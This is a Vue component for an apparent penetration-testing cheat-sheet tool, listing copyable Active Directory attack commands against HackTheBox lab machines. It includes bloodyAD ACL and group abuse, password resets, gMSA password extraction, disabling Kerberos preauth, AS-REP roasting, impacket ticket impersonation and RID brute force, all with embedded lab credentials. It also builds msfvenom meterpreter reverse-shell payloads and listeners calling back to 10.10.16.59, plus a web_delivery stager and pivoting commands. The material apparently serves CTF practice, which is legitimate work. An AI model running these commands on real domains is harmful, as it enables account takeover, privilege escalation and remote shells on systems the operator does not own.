<template>
  <div class="demo-collapse">
    <el-collapse v-model="activeNames" @change="handleChange" accordion>
      <el-collapse-item
        v-for="(command, key_c, index) in commands"
        :key="index"
        :name="index + 1"
      >
        <template #title>
          <span class="custom-title"
            >{{ key_c }}
            <el-icon class="header-icon">
              <a :href="Links[key_c]" target="_blank" rel="noopener noreferrer">
                <info-filled />
              </a>
            </el-icon>
          </span>
        </template>
        <div
          v-for="(commandContent, commandName) in command"
          :key="commandName"
          class="input-container"
        >
          <label :for="key">{{ commandName }}:</label>
          <el-input
            :id="key"
            v-model="command[commandName]"
            readonly
            type="textarea"
            :autosize="{ minRows: 1, maxRows: 5 }"
          >
          </el-input>
          <el-button @click="copyToClipboard(command[commandName])"
            >复制</el-button
          >
        </div>
      </el-collapse-item>
    </el-collapse>
  </div>
</template>

<script >
import { InfoFilled } from "@element-plus/icons-vue";
import { mapState } from "vuex";
import {
  copyToClipboard,
  resetCommands,
  updateCommands,
} from "@/utils/utils.js";

export default {
  components: {
    "info-filled": InfoFilled,
  },
  computed: {
    ...mapState(["sharedData"]), // 映射 Vuex state
  },
  methods: {
    async copyToClipboard(text) {
      const message = await copyToClipboard(text);
      this.$message.success(message);
    },
  },
  watch: {
    sharedData(newValue) {
      const storedData = localStorage.getItem("sharedData");
      if (!storedData || JSON.stringify(newValue) !== storedData) {
        localStorage.setItem("sharedData", JSON.stringify(newValue));
        console.log("已更新 sharedData:", newValue);
      }
      console.log("共享数据更新:", newValue["local_ip"]); // 当 sharedData 变化时打印数据
      if (this.attack_ip !== "{{Attack_IP}}") {
        resetCommands(this.commands, this.attack_ip); // 更新命令
      }
      this.attack_ip = newValue["attack_ip"];
      updateCommands(this.commands, this.attack_ip); // 更新命令
    },
  },
  data() {
    return {
      attack_ip: "{{Attack_IP}}", // 使用 data 定义响应式数据
      commands: {
        "Validate Creds": {
          smb: "netexec smb rebound.htb -u oorend -p '1GR8t@$$4u'",
          winrm: "netexec winrm rebound.htb -u oorend -p '1GR8t@$$4u'",
          ldap: "netexec ldap rebound.htb -u oorend -p '1GR8t@$$4u'",
          ldaps: "netexec ldap rebound.htb -u oorend -p '1GR8t@$$4u' -k",
          "evil-winrm":
            "evil-winrm -i dc01.rebound.htb -u winrm_svc -p 'LeetPassword123!'",
        },
        "bloodhound (Neo4j)": {
          ntpdate: "ntpdate domain",
          bloodhound:
            "bloodhound-python -d rebound.htb -c all -u oorend -p '1GR8t@$$4u' -ns 10.10.11.231 --zip",
        },
        bloodAD: {
          "add user to group":
            "bloodyAD -d rebound.htb -u oorend -p '1GR8t@$$4u' --host dc01.rebound.htb add groupMember ServiceMGMT oorend",
          "grant GENERICALL":
            "bloodyAD -d rebound.htb -u oorend -p '1GR8t@$$4u' --host dc01.rebound.htb add genericAll 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' oorend",
          "set password User":
            "bloodyAD -d rebound.htb -u oorend -p '1GR8t@$$4u' --host dc01.rebound.htb set password User_Account 'LeetPassword123!'",
          "msDS-ManagedPassword":
            "bloodyAD -d rebound.htb -u tbrady -p 543BOMBOMBUNmanda --host dc01.rebound.htb get object 'delegator$' --attr msDS-ManagedPassword",
          禁用预认证:
            'bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k add uac SVC_ARK -f DONT_REQ_PREAUTH',
          "启用账户，移除UAC设置":
            'bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k remove uac SVC_ARK -f ACCOUNTDISABLE',
          "add service":
            'bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k set object "SVC_SQL" servicePrincipalName  -v "cifs/fake"',
        },
        netexec: {
          "msDS-ManagedPassword":
            "netexec ldap rebound.htb -u tbrady -p 543BOMBOMBUNmanda -k --gmsa",
          "BruteForce Sid":
            "netexec smb 10.10.11.222 -u guest -p '' --rid-brute",
        },
        impacket: {
          getTGT:
            "impacket-getTGT vintage.htb/P.Rosa:Rosaisbest123 -dc-ip dc01.vintage.htb",
          getST:
            "impacket-getST -spn 'cifs/dc01.vintage.htb' -impersonate L.BIANCHI_ADM -dc-ip 10.10.11.45 -k 'vintage.htb/svc_sql:Zer0the0ne' ",
          "列出不需要 Kerberos 域认证的用户":
            "impacket-GetNPUsers -dc-ip 10.10.11.45 -request -usersfile usernames.txt vintage.htb/",
          "BruteForce Sid": "lookupsid.py guest@10.10.11.222 -no-pass",
          "SAM Enumerate Domain Users":
            "samrdump.py htb.local/amanda:Ashare1972@10.10.10.103",
        },
        ldapsearch: {
          批量获取AD用户登录名: "ldapsearch -x -H ldap://",
        },
        MSF: {
          example_exe:
            "msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.16.59 lport=9876 -f exe -o evil.exe",
          example_listen:
            "msfconsole\nuse exploit/multi/handler\nset payload windows/x64/meterpreter/reverse_tcp\nset lhost 10.10.16.59\nset lport 9876\nrun",
          Web_delivery:
            "msfconsole\nuse exploit/multi/script/web_delivery\nset payload windows/x64/meterpreter/reverse_tcp\nset target 2 (powershell)\nset lhost 10.10.16.59\nset lport 9876\nrun",
          proxy1: "meterpreter > portfwd add -l 80 -r 172.19.0.4 -p 80",
          proxy2: "use post/multi/manage/autoroute",
          proxy3: "use auxiliary/server/socks5",
        },
      },
      Links: {
        "bloodhound (Neo4j)": "https://github.com/dirkjanm/BloodHound.py",
        bloodAD: "https://github.com/CravateRouge/bloodyAD/wiki/User-Guid",
        netexec: "https://www.netexec.wiki/",
        impacket: "https://www.coresecurity.com/core-labs/impacket",
        ldapsearch:
          "https://docs.ldap.com/ldap-sdk/docs/tool-usages/ldapsearch.html",
        smbclient:
          "https://www.samba.org/samba/docs/4.9/man-html/smbclient.1.html",
        crackmapexec: "https://cn-sec.com/archives/2327182.html",
        smbmap: "https://github.com/ShawnDEvans/smbmap",
        manspider: "https://github.com/blacklanternsecurity/MANSPIDER",
        "enum4linux-ng": "https://github.com/cddmp/enum4linux-ng",
        rebeus: "https://github.com/GhostPack/Rubeus",
        Runascs: "https://github.com/antonioCoco/RunasCs",
        "Certify.exe": "https://github.com/GhostPack/Certify",
        certipy: [
          "https://github.com/ly4k/Certipy",
          "https://github.com/arth0sz/Practice-AD-CS-Domain-Escalation",
        ],
      },
      proxy_tools: {
        chisle: "https://github.com/jpillora/chisel",
        ssf: "https://github.com/securesocketfunneling/ssf",
        LightweightSSH: "https://matt.ucc.asn.au/dropbear/dropbear.html",
      },
    };
  },
};
</script>

<style>
.custom-title {
  font-size: 1.2em; /* 改变字体大小 */
  font-weight: bold; /* 加粗字体 */
}
.input-container {
  display: flex;
  align-items: center; /* 垂直居中对齐 */
  margin-bottom: 9px;
}

label {
  margin-right: 4px;
  width: 130px;
}
</style>